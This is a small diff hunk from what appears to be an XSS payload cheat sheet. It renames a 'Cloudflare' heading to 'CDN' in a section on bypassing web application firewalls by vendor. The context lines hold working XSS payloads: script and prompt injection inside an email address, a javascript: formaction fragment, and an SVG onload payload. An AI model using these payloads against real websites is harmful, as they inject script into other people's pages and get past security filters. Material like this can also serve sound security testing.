@@ -138,7 +138,7 @@ over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascrip
 
 ## 8. WAF BYPASS BY VENDOR
 
-### Cloudflare
+### CDN
 
 ```html
 <svg onload=prompt``>
